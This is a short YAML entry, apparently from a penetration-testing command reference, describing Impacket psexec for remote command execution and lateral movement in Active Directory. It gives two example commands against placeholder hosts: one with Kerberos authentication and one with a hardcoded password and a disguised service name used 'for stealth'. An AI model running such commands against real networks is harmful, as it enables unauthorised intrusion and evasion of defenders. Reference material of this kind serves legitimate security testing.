...
name: psexec
description: Impacket psexec — Windows remote command execution via SMB service control
  manager for lateral movement in Active Directory environments.
...
- description: Kerberos-based authentication
  command: impacket-psexec evilcorp.local/administrator@10.10.10.1 -k -dc-ip 10.10.10.1
    -no-pass
- description: Custom service name for stealth
  command: impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1 -service-name
    LegitSvc
